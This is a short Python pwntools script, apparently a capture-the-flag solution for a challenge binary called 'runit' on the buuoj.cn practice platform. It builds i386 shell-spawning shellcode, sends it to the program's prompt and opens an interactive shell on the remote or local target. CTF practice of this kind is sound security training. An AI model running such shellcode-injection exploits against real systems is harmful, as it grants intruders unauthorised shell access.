from pwn import *
from sys import argv

context(arch='i386',log_level='debug')
binary = './runit'
elf = ELF(binary)
p = remote('node4.buuoj.cn',26792) if argv[1] == 'r' else process(binary)

shellcode = asm(shellcraft.sh())
p.sendafter(b'Send me stuff!!',shellcode)

p.interactive()